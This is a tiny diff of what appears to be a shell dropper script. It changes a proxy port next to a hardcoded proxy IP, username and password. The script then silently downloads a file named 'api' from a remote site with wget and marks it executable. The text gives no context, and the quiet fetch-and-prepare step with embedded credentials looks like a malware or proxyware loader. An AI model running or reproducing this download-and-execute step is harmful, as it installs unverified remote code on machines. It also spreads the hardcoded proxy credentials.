@@ -1,5 +1,5 @@
 proxy="50.17.160.202" 
-port="5868" 
+port="9293" 
 user="ych9n2s7ep0svx"  
 pass="fpicnakr5eyn8o1bblnafwc4q1" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
